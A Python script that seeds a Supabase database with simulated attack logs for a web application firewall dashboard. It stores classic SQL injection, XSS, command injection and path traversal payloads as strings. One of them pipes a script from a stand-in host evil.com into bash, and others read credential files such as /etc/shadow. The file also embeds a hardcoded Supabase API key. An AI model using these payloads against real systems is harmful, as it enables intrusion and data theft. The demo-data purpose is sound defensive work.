"""
SH-WAF Attack Simulator
Run: python test_attacks.py
Inserts real attack logs into Supabase — shows up live in Dashboard, Traffic Monitor, Attack Logs
"""

import requests
import random
import time
from datetime import datetime, timezone

SUPABASE_URL  = "https://aeybayjzgdhjupiegymz.supabase.co"
SUPABASE_KEY  = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImFleWJheWp6Z2RoanVwaWVneW16Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODE0MzY0NzIsImV4cCI6MjA5NzAxMjQ3Mn0.iLwJHGCw4VJDPHcsQSayJ4Ueptu-m4EKdncUvH8dKw0"

HEADERS = {
    "apikey": SUPABASE_KEY,
    "Authorization": f"Bearer {SUPABASE_KEY}",
    "Content-Type": "application/json",
    "Prefer": "return=minimal"
}

ATTACKS = [
    {
        "attack_type": "SQL Injection",
        "payloads": [
            "' OR '1'='1",
            "'; DROP TABLE users; --",
            "' UNION SELECT * FROM users --",
            "admin'--",
            "1' OR '1' = '1' /*",
        ],
        "paths": ["/login", "/search", "/api/users", "/admin/query"],
        "severity": "Critical",
        "ai_score": lambda: round(random.uniform(0.75, 0.98), 2),
    },
    {
        "attack_type": "XSS",
        "payloads": [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert(1)>",
            "javascript:alert(document.cookie)",
            "<svg onload=alert(1)>",
            "'\"><script>document.location='http://evil.com'</script>",
        ],
        "paths": ["/comment", "/profile", "/search", "/feedback"],
        "severity": "High",
        "ai_score": lambda: round(random.uniform(0.60, 0.90), 2),
    },
    {
        "attack_type": "Command Injection",
        "payloads": [
            "; ls -la",
            "| cat /etc/passwd",
            "&& whoami",
            "`id`",
            "; curl http://evil.com/shell.sh | bash",
        ],
        "paths": ["/api/ping", "/api/exec", "/tools/scan", "/api/run"],
        "severity": "Critical",
        "ai_score": lambda: round(random.uniform(0.80, 0.99), 2),
    },
    {
        "attack_type": "Path Traversal",
        "payloads": [
            "../../../../etc/passwd",
            "../../../windows/system32/config/sam",
            "..%2F..%2F..%2Fetc%2Fshadow",
            "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "....//....//etc/passwd",
        ],
        "paths": ["/download", "/file", "/static", "/api/read"],
        "severity": "High",
        "ai_score": lambda: round(random.uniform(0.65, 0.92), 2),
    },
    {
        "attack_type": "Normal",
        "payloads": ["", "", "q=hello", "page=1", "id=42"],
        "paths": ["/", "/home", "/about", "/api/products", "/api/users/me"],
        "severity": "Low",
        "ai_score": lambda: round(random.uniform(0.01, 0.15), 2),
    },
]

IPS = [
    "192.168.1.101", "10.0.0.55", "203.0.113.42", "198.51.100.7",
    "45.33.32.156", "172.16.0.23", "185.220.101.5", "91.108.4.1",
    "1.2.3.4", "8.8.8.8", "66.249.64.1", "104.16.0.1",
]

METHODS  = ["GET", "POST", "PUT", "DELETE"]
STATUSES = ["Blocked", "Blocked", "Blocked", "Healed", "Allowed", "Flagged"]
COUNTRIES = ["IN", "US", "CN", "RU", "BR", "DE", "FR", "GB"]
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "sqlmap/1.7.8#stable (https://sqlmap.org)",
    "curl/7.68.0",
    "python-requests/2.28.0",
    "Mozilla/5.0 (compatible; Googlebot/2.1)",
    "Nikto/2.1.6",
]


def insert_log(attack):
    payload_val = random.choice(attack["payloads"])
    score       = attack["ai_score"]()
    status      = "Allowed" if attack["attack_type"] == "Normal" else random.choice(STATUSES[:4])

    row = {
        "source_ip":     random.choice(IPS),
        "attack_type":   attack["attack_type"],
        "payload":       payload_val,
        "path":          random.choice(attack["paths"]),
        "method":        random.choice(METHODS),
        "severity":      attack["severity"],
        "status":        status,
        "ai_score":      score,
        "response_code": 403 if status == "Blocked" else 200,
        "bytes_in":      random.randint(64, 4096),
        "country":       random.choice(COUNTRIES),
        "user_agent":    random.choice(USER_AGENTS),
        "timestamp":     datetime.now(timezone.utc).isoformat(),
    }

    resp = requests.post(
        f"{SUPABASE_URL}/rest/v1/attack_logs",
        headers=HEADERS,
        json=row,
        timeout=10,
    )

    if resp.status_code in (200, 201):
        print(f"  OK [{row['attack_type']:20s}] {row['source_ip']:15s}  score={score}  status={status}")
    else:
        print(f"  ERR {resp.status_code}: {resp.text[:100]}")


def run(count=20, delay=0.5):
    print(f"\n{'='*60}")
    print(f"  SH-WAF Attack Simulator")
    print(f"  Sending {count} attack logs to Supabase...")
    print(f"  Watch them appear LIVE in your dashboard!")
    print(f"{'='*60}\n")

    for i in range(count):
        # 70% attacks, 30% normal traffic
        attack = random.choices(ATTACKS, weights=[20, 20, 15, 15, 30])[0]
        print(f"[{i+1:02d}/{count}]", end=" ")
        insert_log(attack)
        time.sleep(delay)

    print(f"\n{'='*60}")
    print(f"  Done! Check your SH-WAF dashboard now.")
    print(f"{'='*60}\n")


if __name__ == "__main__":
    import sys
    count = int(sys.argv[1]) if len(sys.argv) > 1 else 20
    delay = float(sys.argv[2]) if len(sys.argv) > 2 else 0.5
    run(count, delay)
